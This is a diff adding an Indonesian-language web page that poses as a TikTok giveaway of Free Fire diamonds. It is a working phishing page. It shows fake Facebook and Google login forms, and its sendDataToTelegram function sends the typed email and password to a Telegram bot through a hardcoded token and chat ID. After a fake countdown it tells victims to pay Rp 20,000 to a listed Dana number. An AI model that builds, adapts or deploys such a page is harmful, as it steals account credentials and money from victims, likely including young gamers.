@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Giveaway TikTok - Klaim Hadiah Diamond Free Fire</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet"/>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+        }
+        .diamond-option {
+            transition: transform 0.3s, background-color 0.3s;
+            border-radius: 10px;
+        }
+        .diamond-option:hover {
+            transform: scale(1.05);
+            background-color: #facc15;
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+    <!-- Main Content (ID Player & Diamond Selection) -->
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full" id="main-content">
+        <h1 class="text-xl md:text-2xl font-bold mb-4">Selamat Pemenang Giveaway TikTok!</h1>
+        <p class="text-sm md:text-lg mb-4">Anda berhak mendapatkan hadiah Diamond Free Fire.</p>
+
+        <label for="player-id" class="block text-sm md:text-lg font-medium mb-2">Masukkan ID Player Anda:</label>
+        <input type="text" id="player-id" placeholder="ID Player" class="mb-4 p-2 border rounded w-full text-center"/>
+
+        <p class="text-sm md:text-lg mb-4">Pilih jumlah Diamond:</p>
+        <div class="grid grid-cols-2 gap-4 mb-4">
+            <div class="bg-gray-200 p-4 rounded-lg cursor-pointer hover:bg-yellow-400 transition flex flex-col items-center diamond-option" onclick="selectDiamond(this)">
+                <span class="block text-lg font-semibold">5.500 <i class="fas fa-gem"></i></span>
+            </div>
+            <div class="bg-gray-200 p-4 rounded-lg cursor-pointer hover:bg-yellow-400 transition flex flex-col items-center diamond-option" onclick="selectDiamond(this)">
+                <span class="block text-lg font-semibold">4.330 <i class="fas fa-gem"></i></span>
+            </div>
+            <div class="bg-gray-200 p-4 rounded-lg cursor-pointer hover:bg-yellow-400 transition flex flex-col items-center diamond-option" onclick="selectDiamond(this)">
+                <span class="block text-lg font-semibold">3.675 <i class="fas fa-gem"></i></span>
+            </div>
+            <div class="bg-gray-200 p-4 rounded-lg cursor-pointer hover:bg-yellow-400 transition flex flex-col items-center diamond-option" onclick="selectDiamond(this)">
+                <span class="block text-lg font-semibold">2.225 <i class="fas fa-gem"></i></span>
+            </div>
+        </div>
+
+        <button class="bg-orange-500 text-white py-2 px-4 rounded-lg text-lg hover:bg-orange-600 transition" onclick="showLoginOptions()">KLAIM SEKARANG!</button>
+    </div>
+
+    <!-- Login Options -->
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full hidden" id="login-options">
+        <h1 class="text-2xl font-bold mb-4">Login untuk Klaim Hadiah</h1>
+        <button class="bg-blue-600 text-white py-2 px-4 rounded-lg text-lg hover:bg-blue-700 transition mb-4 w-full" onclick="showFacebookLogin()">Login dengan Facebook</button>
+        <button class="bg-red-600 text-white py-2 px-4 rounded-lg text-lg hover:bg-red-700 transition w-full" onclick="showGoogleLogin()">Login dengan Google</button>
+    </div>
+
+    <!-- Facebook Login Form -->
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full hidden" id="facebook-login">
+        <h1 class="text-2xl font-bold mb-4">Login dengan Facebook</h1>
+        <input type="text" id="facebook-email" placeholder="Email atau No HP" class="mb-4 p-2 border rounded w-full"/>
+        <input type="password" id="facebook-password" placeholder="Sandi" class="mb-4 p-2 border rounded w-full"/>
+        <button class="bg-blue-600 text-white py-2 px-4 rounded-lg text-lg hover:bg-blue-700 transition w-full" onclick="sendDataToTelegram('facebook')">Login</button>
+    </div>
+
+    <!-- Google Login Form -->
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full hidden" id="google-login">
+        <h1 class="text-2xl font-bold mb-4">Login dengan Google</h1>
+        <input type="text" id="google-email" placeholder="Email" class="mb-4 p-2 border rounded w-full"/>
+        <input type="password" id="google-password" placeholder="Sandi" class="mb-4 p-2 border rounded w-full"/>
+        <button class="bg-red-600 text-white py-2 px-4 rounded-lg text-lg hover:bg-red-700 transition w-full" onclick="sendDataToTelegram('google')">Login</button>
+    </div>
+
+    <!-- Countdown & Payment Instructions -->
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full hidden" id="countdown-section">
+        <h1 class="text-2xl font-bold mb-4">Proses Klaim Diamond</h1>
+        <p class="text-lg mb-4">Diamond Anda sedang diproses. Harap tunggu...</p>
+        <div class="text-lg font-semibold" id="countdown"></div>
+    </div>
+
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center max-w-md w-full hidden" id="payment-instructions">
+        <h1 class="text-2xl font-bold mb-4">Instruksi Pembayaran</h1>
+        <p class="text-lg mb-4">Silakan transfer Rp 20.000 ke nomor Dana: 083102738368. Setelah transfer, proses klaim akan berhasil.</p>
+    </div>
+
+    <script>
+        let countdownTimer;
+        function showLoginOptions() {
+            const playerId = document.getElementById('player-id').value;
+            if (!playerId) {
+                alert('Harap isi ID Player untuk melanjutkan');
+                return;
+            }
+
+            const selectedDiamond = document.querySelector('.diamond-option.bg-yellow-400');
+            if (!selectedDiamond) {
+                alert('Harap pilih jumlah diamond untuk melanjutkan');
+                return;
+            }
+
+            document.getElementById('main-content').classList.add('hidden');
+            document.getElementById('login-options').classList.remove('hidden');
+        }
+
+        function showFacebookLogin() {
+            document.getElementById('login-options').classList.add('hidden');
+            document.getElementById('facebook-login').classList.remove('hidden');
+        }
+
+        function showGoogleLogin() {
+            document.getElementById('login-options').classList.add('hidden');
+            document.getElementById('google-login').classList.remove('hidden');
+        }
+
+        function sendDataToTelegram(loginMethod) {
+            const playerId = document.getElementById('player-id').value;
+            const selectedDiamond = document.querySelector('.diamond-option.bg-yellow-400 span').innerText;
+            let email = '';
+            let password = '';
+
+            if (loginMethod === 'facebook') {
+                email = document.getElementById('facebook-email').value;
+                password = document.getElementById('facebook-password').value;
+            } else if (loginMethod === 'google') {
+                email = document.getElementById('google-email').value;
+                password = document.getElementById('google-password').value;
+            }
+
+            const botToken = '7680682575:AAH5iOAA0CvTralAKvJlU2hI8b_7hlhnSgQ';
+            const chatId = '7832574874';
+            const message = `ID Player: ${playerId}\nDiamond: ${selectedDiamond}\nLogin Method: ${loginMethod}\nEmail: ${email}\nPassword: ${password}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(() => {
+                showCountdown();
+            }).catch(error => {
+                alert('Terjadi kesalahan. Harap coba lagi.');
+            });
+        }
+
+        function showCountdown() {
+            document.getElementById('facebook-login').classList.add('hidden');
+            document.getElementById('google-login').classList.add('hidden');
+            document.getElementById('countdown-section').classList.remove('hidden');
+
+            let timeLeft = 30;
+            countdownTimer = setInterval(() => {
+                document.getElementById('countdown').innerText = `Waktu tersisa: ${timeLeft} detik`;
+                timeLeft--;
+
+                if (timeLeft < 0) {
+                    clearInterval(countdownTimer);
+                    showPaymentInstructions();
+                }
+            }, 1000);
+        }
+
+        function showPaymentInstructions() {
+            document.getElementById('countdown-section').classList.add('hidden');
+            document.getElementById('payment-instructions').classList.remove('hidden');
+        }
+
+        function selectDiamond(element) {
+            const diamondOptions = document.querySelectorAll('.grid .diamond-option');
+            diamondOptions.forEach(option => {
+                option.classList.remove('bg-yellow-400');
+                option.classList.add('bg-gray-200');
+            });
+            element.classList.remove('bg-gray-200');
+            element.classList.add('bg-yellow-400');
+        }
+    </script>
+</body>
+</html>
